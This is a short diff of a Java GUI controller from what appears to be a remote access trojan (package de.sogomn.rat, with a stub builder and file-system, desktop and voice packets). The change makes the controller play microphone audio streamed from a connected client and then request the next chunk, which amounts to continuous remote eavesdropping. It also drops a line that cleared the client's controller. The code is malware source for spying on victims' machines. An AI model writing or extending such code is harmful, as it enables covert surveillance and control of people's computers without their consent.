@@ -7,6 +7,8 @@ import java.util.ArrayList;
 import javax.swing.JFileChooser;
 import javax.swing.JOptionPane;
 
+import de.sogomn.engine.fx.ISoundListener;
+import de.sogomn.engine.fx.Sound;
 import de.sogomn.rat.ActiveClient;
 import de.sogomn.rat.IClientObserver;
 import de.sogomn.rat.builder.StubBuilder;
@@ -180,11 +182,22 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	private void handle(final ServerClient serverClient, final VoicePacket packet) {
-		final VoicePacket voice = new VoicePacket();
+		final Sound sound = packet.getSound();
 		
-		packet.execute(serverClient.client);
-		
-		serverClient.client.addPacket(voice);
+		sound.addListener(new ISoundListener() {
+			@Override
+			public void looped(final Sound source) {
+				//...
+			}
+			
+			@Override
+			public void stopped(final Sound source) {
+				final VoicePacket voice = new VoicePacket();
+				
+				serverClient.client.addPacket(voice);
+			}
+		});
+		sound.play();
 	}
 	
 	private void handle(final ServerClient serverClient, final FileSystemPacket packet) {
@@ -308,7 +321,6 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 		} else if (command == RattyGui.FREE) {
 			serverClient.setStreamingDesktop(false);
 			serverClient.setStreamingVoice(false);
-			serverClient.setController(null);
 		}
 	}
 	
